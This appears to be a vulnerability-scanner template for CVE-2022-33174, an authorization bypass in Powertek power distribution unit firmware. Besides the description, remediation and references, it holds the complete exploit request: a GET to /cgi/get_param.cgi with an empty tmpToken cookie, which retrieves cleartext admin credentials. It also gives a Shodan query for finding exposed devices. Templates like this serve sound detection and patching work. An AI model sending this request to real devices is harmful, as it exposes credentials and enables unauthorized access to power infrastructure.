id: CVE-2022-33174
info:
  name: Powertek Firmware <3.30.30 - Authorization Bypass
  author: pikpikcu
  description: 'Powertek firmware (multiple brands) before 3.30.30 running Power Distribution
    Units are vulnerable to authorization bypass in the web interface. To exploit
    the vulnerability, an attacker must send an HTTP packet to the data retrieval
    interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string
    followed by a semicolon. This bypasses an active session authorization check.
    This can be then used to fetch the values of protected sys.passwd and sys.su.name
    fields that contain the username and password in cleartext.

    '
  severity: high
  impact: 'An attacker can bypass authentication and gain unauthorized access to the
    Powertek Firmware, potentially leading to further compromise of the system.

    '
  remediation: 'Upgrade the Powertek Firmware to version 3.30.30 or higher to mitigate
    the vulnerability.

    '
  reference:
  - https://gynvael.coldwind.pl/?lang=en&id=748
  - https://nvd.nist.gov/vuln/detail/CVE-2022-33174
  - https://github.com/Henry4E36/CVE-2022-33174
  - https://github.com/k0mi-tg/CVE-POC
  - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-33174
    cwe-id: CWE-863
    epss-score: 0.01241
    epss-percentile: 0.85189
    cpe: cpe:2.3:o:powertekpdus:basic_pdu_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: powertekpdus
    product: basic_pdu_firmware
    shodan-query: http.html:"Powertek"
  tags: cve2022,cve,powertek,auth-bypass,powertekpdus
traps:
- request:
    method: GET
    path: /cgi/get_param.cgi?xml&sys.passwd&sys.su.name
    headers:
      Cookie: tmpToken=;
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <sys.passwd><sys.su.name>
